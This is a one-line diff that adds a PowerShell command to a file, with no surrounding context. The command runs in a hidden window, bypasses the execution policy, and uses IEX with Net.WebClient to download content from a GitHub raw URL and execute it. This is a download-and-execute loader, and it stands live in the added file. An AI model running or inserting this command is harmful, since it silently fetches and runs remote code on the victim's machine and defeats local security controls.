@@ -1,0 +1,1 @@
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cmcmorris/cmd-scripts/refs/heads/General/script.exe')"
